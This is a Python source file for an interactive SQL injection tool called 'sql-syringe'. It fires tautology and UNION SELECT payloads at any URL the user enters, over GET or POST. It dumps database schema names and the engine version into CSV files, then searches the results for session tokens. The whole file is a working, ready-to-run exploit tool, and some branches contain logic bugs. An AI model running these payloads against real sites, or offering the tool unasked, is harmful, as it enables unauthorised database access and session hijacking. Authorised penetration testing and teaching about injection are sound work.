#!/usr/bin/python3

"""
Program: sql-syringe.py
Date Created: 03/03/2025
Date Modified: 03/07/2025
Developer: Cybersniper-dev
Purpose: SQL injection toolkit designed to assist in testing web applications for SQL injection vulnerabilities
"""

import requests
import lxml.html
import time

def extract_table(r: str) -> list:
    tree = lxml.html.fromstring(r.content)
    return tree.xpath('//*/table/tr/*//text()')

def injection_test(url: str) -> None:
    print("Running injection test!!!")

    print("Attempting integer truth statement")
    try:
        for i in range(0, 9 + 1, 1):
            req = requests.get(url + f"{i} OR 1=1")
            table = extract_table(req)
            print(f"\nAttempt {i} Status Code: {req.status_code}")
            if len(table) != 0:
                print(table)
                print()
                print(f"Successful URL: {url}" + f"{i} OR 1=1")
            else:
                print("No table found...")
                pass
    except:
        print("Integer URL Error")

    print("Attempting integer truth statement")
    for i in range(0, 9 + 1, 1):
        req = requests.get(url + f"{i}' OR 1='1")
        table = extract_table(req)
        print(f"\nAttempt {i} Status Code: {req.status_code}")
        if len(table) != 0:
            print(table)
            print()
            print(f"Successful URL: {url}" + f"{i}' OR 1='1")
            time.sleep(2)
        else:
            print("No table found...")
            pass

    print("\nAttempting POST request injection")

    form_data = {}
    while True:

        field = str(input("Enter field or press enter to stop: "))
        value = str(input("Enter value or press enter to stop: "))

        if field == "" or value == "":
            break
        else:
            form_data[field]=value

    req = requests.post(url, data=form_data)
    table = extract_table(req)

    if len(table) != 0:
        print(f"\nStatus Code: {req.status_code}")
        print(table)
        print()
        print(f"Successful URL: {url}" + f"{i}' OR 1='1")
        print(f"Form Data: {form_data}\n")
        time.sleep(3)
    
    print("Injection tests complete!")
    time.sleep(2)

def golden(url: str, total_columns: int, method: int) -> None:
    
    print("Attempting Golden Statement inject!")

    if method == 1:

        if total_columns <= 3:
            golden_statement = " UNION SELECT table_schema, table_name, column_name from information_schema.columns #"
            req = requests.get(url + golden_statement)
            table = extract_table(req)
            print(f"\nStatus Code: {req.status_code}")
        else:
            difference = total_columns - 3
            lower_diff = ', '.join([str(i) for i in range(1, difference + 1, 1)])
            upper_diff = ', '.join([str(i) for i in range((total_columns + 3 - total_columns) + 1, total_columns + 1, 1)])
            
            # Lower
            golden_statement = f" UNION SELECT {lower_diff}, table_schema, table_name, column_name from information_schema.columns #"
            req = requests.get(url + golden_statement)
            table = extract_table(req)


        print(f"\nStatus Code: {req.status_code}")
        print(f"\nQuery: {url + golden_statement}")
        
        if len(table) > total_columns:
            pass
        else:
            # Upper
            golden_statement = f" UNION SELECT table_schema, table_name, column_name, {upper_diff} from information_schema.columns #"
            req = requests.get(url + golden_statement)
            table = extract_table(req)
    
    elif method == 2:

        if total_columns == 3:
            golden_statement = " UNION SELECT table_schema, table_name, column_name from information_schema.columns #"

        elif total_columns > 3:
            difference = total_columns - 3
            lower_diff = ', '.join([str(i) for i in range(1, difference + 1, 1)])
            upper_diff = ', '.join([str(i) for i in range((total_columns + 3 - total_columns) + 1, total_columns + 1, 1)])
            form_data_upper = {}
            form_data_lower = {}
        else:
            print("Invalid entry... columns less than three are not allowed for golden query...")
            return
            
        form_data = {}

        while True:
            field = str(input("Enter field (or press enter to continue): "))
            value = str(input("Enter value (or press enter to continue): "))
            vuln = str(input("Is this a vulnerable field (Y or N): "))

            if field == "" or value == "" or vuln == "":
                break

            if total_columns > 3:

                if vuln.lower() == "y":
                    # Upper
                    golden_statement_upper = f"' UNION SELECT table_schema, table_name, column_name, {upper_diff} from information_schema.columns #"

                    # Lower
                    golden_statement_lower = f"' UNION SELECT {lower_diff}, table_schema, table_name, column_name from information_schema.columns #"

                    value += golden_statement_upper
                    value += golden_statement_lower
                else:
                    pass

                form_data_upper[field] = value
                form_data_lower[field] = value

                if len(form_data_upper) < 1:
                    print("No form data provided for the upper query...")
                    return
                
                if len(form_data_lower) < 1:
                    print("No form data provided for the lower query...")
                    return

            elif total_columns == 3:

                if vuln.lower() == "y":
                    value += golden_statement
                else:
                    pass

                form_data[field] = value

                if len(form_data) < 1:
                    print("No form data provided...")
                    return

        if total_columns == 3:
            req = requests.post(url, form_data)
            table = extract_table(req)
        else:
            req_upper = requests.post(url, form_data_upper)
            upper_table = extract_table(req_upper)
            
            req_lower = requests.post(url, form_data_lower)
            lower_table = extract_table(req_lower)

    else:
        print("Invalid option!")
        return

    if total_columns == 3:
        if len(table) > total_columns:
            with open('golden-table.csv', 'w') as outfile:
                print("Success!")
                time.sleep(2)
                print("Writing database schema to csv file!")
                col_count=0
                row = []
                for item in table:
                    col_count += 1
                    
                    row.append(item)
                    if col_count == total_columns:
                        outfile.write(f"{','.join(row)}\n")
                        col_count = 0
                        row = []
            
            print("Complete and written to ./golden-table.csv!")
    else:
        if len(upper_table) > total_columns:
            with open('golden-table-upper.csv', 'w') as outfile:
                print("Success!")
                time.sleep(2)
                print("Writing database schema to csv file!")
                col_count=0
                row = []
                for item in upper_table:
                    col_count += 1
                    
                    row.append(item)
                    if col_count == total_columns:
                        outfile.write(f"{','.join(row)}\n")
                        col_count = 0
                        row = []
            print("Complete and written to ./golden-table-upper.csv!")
            return
        else:
            print("\nGolden upper query failed....")
            time.sleep(2)

        if len(lower_table) > total_columns:
            with open('golden-table-lower.csv', 'w') as outfile:
                print("Success!")
                time.sleep(2)
                print("Writing database schema to csv file!")
                col_count=0
                row = []
                for item in lower_table:
                    col_count += 1
                    
                    row.append(item)
                    if col_count == total_columns:
                        outfile.write(f"{','.join(row)}\n")
                        col_count = 0
                        row = []
            print("Complete and written to ./golden-table-lower.csv!")
            return
        else:
            print("\nGolden lower query failed....")
            time.sleep(2)

# Need to add POST injection
def version(url: str, total_columns: int, method: int) -> None:
    print("Attempting Version Statement inject!")


    if method == 1:
        if total_columns == 1:
            version_statement = " UNION SELECT @@version #"
            req = requests.get(url + version_statement)
            table = extract_table(req)
            print(f"\nStatus Code: {req.status_code}")
        else:
            difference = total_columns - 1
            lower_diff = ', '.join([str(i) for i in range(1, difference + 1, 1)])
            upper_diff = ', '.join([str(i) for i in range((total_columns + 1 - total_columns) + 1, total_columns + 1, 1)])
            
            # Lower
            version_statement = f" UNION SELECT {lower_diff}, @@version #"
            req = requests.get(url + version_statement)
            table = extract_table(req)
            print(f"\nStatus Code: {req.status_code}")
            print(f"\nQuery: {url + version_statement}")
            
            if len(table) > total_columns:
                pass
            else:
                # Upper
                version_statement = f" UNION SELECT @@version, {upper_diff} #"
                req = requests.get(url + version_statement)
                table = extract_table(req)
                print(f"\nStatus Code: {req.status_code}")
                print(f"\nQuery: {url + version_statement}")
    
    elif method == 2:
        if total_columns == 1:
            version_statement = "' UNION SELECT @@version #"

        elif total_columns > 1:
            difference = total_columns - 1
            lower_diff = ', '.join([str(i) for i in range(1, difference + 1, 1)])
            upper_diff = ', '.join([str(i) for i in range((total_columns + 1 - total_columns) + 1, total_columns + 1, 1)])
            form_data_upper = {}
            form_data_lower = {}
        else:
            print("Invalid entry... columns less than three are not allowed for version query...")
            return
            
        form_data = {}

        while True:
            field = str(input("Enter field (or press enter to continue): "))
            value = str(input("Enter value (or press enter to continue): "))
            vuln = str(input("Is this a vulnerable field (Y or N): "))

            if field == "" or value == "" or vuln == "":
                break

            if total_columns > 1:

                if vuln.lower() == "y":
                    # Upper
                    version_statement_upper = f"' UNION SELECT @@version, {upper_diff} #"

                    # Lower
                    version_statement_lower = f"' UNION SELECT {lower_diff}, @@version #"

                    value += version_statement_upper
                    value += version_statement_lower
                else:
                    pass

                form_data_upper[field] = value
                form_data_lower[field] = value

                if len(form_data_upper) < 1:
                    print("No form data provided for the upper query...")
                    return
                
                if len(form_data_lower) < 1:
                    print("No form data provided for the lower query...")
                    return

            elif total_columns == 3:

                if vuln.lower() == "y":
                    value += version_statement
                else:
                    pass

                form_data[field] = value

                if len(form_data) < 1:
                    print("No form data provided...")
                    return

        if total_columns == 3:
            req = requests.post(url, form_data)
            table = extract_table(req)
        else:
            req_upper = requests.post(url, form_data_upper)
            upper_table = extract_table(req_upper)
            
            req_lower = requests.post(url, form_data_lower)
            lower_table = extract_table(req_lower)

    else:
        print("Invalid option!")
        return

    if total_columns == 1:
        if len(table) > total_columns:
            with open('version-table.csv', 'w') as outfile:
                print("Success!")
                time.sleep(2)
                print("Writing database schema to csv file!")
                col_count=0
                row = []
                for item in table:
                    col_count += 1
                    
                    row.append(item)
                    if col_count == total_columns:
                        outfile.write(f"{','.join(row)}\n")
                        col_count = 0
                        row = []
            
            print("\nComplete and written to ./version-table.csv!")
        else:
            print("\nVersion query failed...")
            time.sleep(3)
    else:
        if len(upper_table) > total_columns:
            with open('version-table-upper.csv', 'w') as outfile:
                print("Success!")
                time.sleep(2)
                print("Writing database schema to csv file!")
                col_count=0
                row = []
                for item in upper_table:
                    col_count += 1
                    
                    row.append(item)
                    if col_count == total_columns:
                        outfile.write(f"{','.join(row)}\n")
                        col_count = 0
                        row = []
            print("Complete and written to ./version-table-upper.csv!")
            return
        else:
            print("\nVersion upper query failed....")
            time.sleep(2)

        if len(lower_table) > total_columns:
            with open('version-table-lower.csv', 'w') as outfile:
                print("Success!")
                time.sleep(2)
                print("Writing database schema to csv file!")
                col_count=0
                row = []
                for item in lower_table:
                    col_count += 1
                    
                    row.append(item)
                    if col_count == total_columns:
                        outfile.write(f"{','.join(row)}\n")
                        col_count = 0
                        row = []
            print("Complete and written to ./version-table-lower.csv!")
            return
        else:
            print("\nVersion lower query failed....")
            time.sleep(2)

def custom(url: str) -> None:
    try:
        print("Running custom inject!")

        print("\nWhich request method would you like to use: ")
        print("\n1. GET (default)")
        print("2. POST\n")

        req_option = int(input("Enter option: "))

        if req_option == 1:
            inject = str(input("Enter inject: "))
            num_columns = int(input("Enter total columns: "))
            
            injection_url = url + inject

            req = requests.get(injection_url)
        
        elif req_option == 2:
            form_data = {}

            while True:
                field = str(input("Enter field (press enter to continue): "))
                value = str(input("Enter value (press enter to continue): "))

                if field == "" or value == "":
                    break

                inject = str(input("Enter inject (press continue to skip): "))
                
                if inject != "":
                    form_data[field]=value + inject
                else:
                    form_data[field]=value
            
            num_columns = int(input("Enter total columns: "))

            req = requests.post(url, data=form_data)
        
        else:
            inject = str(input("Enter inject: "))
            num_columns = int(input("Enter total columns: "))
            injection_url = url + inject
            req = requests.get(injection_url)

        table = extract_table(req)

        print(f"\nReponse Status Code: {req.status_code}")

        if len(table) > num_columns:
            print("Displaying results!")

            col_count=0
            row = []
            for item in table:
                col_count += 1
    
                row.append(item)
                if col_count == num_columns:
                    print(row)
                    col_count = 0
                    row = []
            
            time.sleep(2)

        else:
            print("No results found!")

    except Exception as e:
        print(f"Error: {e}")

def main():

    url = ""

    print("\nSQL-SYRINGE\n\n|--==SQL==>-- ~OR 1=1~\n\nSQL-Injection Toolkit")

    while True:

        print(f"\nSet-URL: {url}\n")

        print("Options:\n")
        print("1. Set Injection URL = Sets the target URL to run SQL injections on")
        print("2. Injection-Test = Test for vulnerable input")
        print("3. Golden Statement Inject = Injects the golden statement into URL")
        print("4. Version Injection = Attempts to detect SQL Engine Version")
        print("5. Draw = Extracts potentially important data from injection results")
        print("6. Custom Inject = Insert your own query into the URL")
        print("7. Exit\n")

        try:
            option = int(input("Enter option: "))
        except Exception as e:
            option = 0
            print(f"{e}")

        
        if option == 1:
            set_url = url
            url = str(input("\nEnter url: "))

            # test for url input validation
            if url != "":
                print(f"\n\nURL {url} set!\n\n")
                time.sleep(3)

            else:
                print("\n\nNo URL detected...\n\n")
                url = set_url
                time.sleep(3)
                pass
        
        elif option == 2:
            if url != "":
                injection_test(url)
            else:
                print("URL not set...")
                time.sleep(3)
        
        elif option == 3:
            try:
                if url != "":
                    num_columns = int(input("Enter the total number of valid columns: "))
                    print("Select Post Method:\n1. GET (default)\n2. POST\n")
                    method = int(input("Enter option: "))

                    golden(url=url, total_columns=num_columns, method=method)
                    time.sleep(3)
                else:
                    print("URL not set...")
                    time.sleep(3)
            except Exception as e:
                print(f"Invalid column value: {e}")

        elif option == 4:
            try:
                if url != "":
                    num_columns = int(input("Enter the total number of valid columns: "))
                    print("Select Post Method:\n1. GET (default)\n2. POST\n")
                    method = int(input("Enter option: "))
                    version(url, num_columns, method)
                    time.sleep(3)
                else:
                    print("URL not set...")
            except Exception as e:
                print(f"Invalid column value: {e}")       

        elif option == 5:
            file = str(input("Enter filepath of datafile: "))

            try:
                with open(file) as infile:
                    for line in infile:
                        line = line.strip()
                        fields = line.split(',')
                        for field in fields:
                            if "session" in field[0:8] and "session_" not in field or 'MariaDB' in field:
                                print(f"{line}")
                

                print("\n\nDone!\n\n")
                time.sleep(3)
            except Exception as e:
                print(f"Error: {e}")

        elif option == 6:
            if url != "":
                custom(url)
            else:
                print("No URL set!")
                time.sleep(3)

        elif option == 7:
            print("Exiting!")
            exit(1)
        else:
            print()
            print("Invalid command")


if __name__ == "__main__":
    main() 
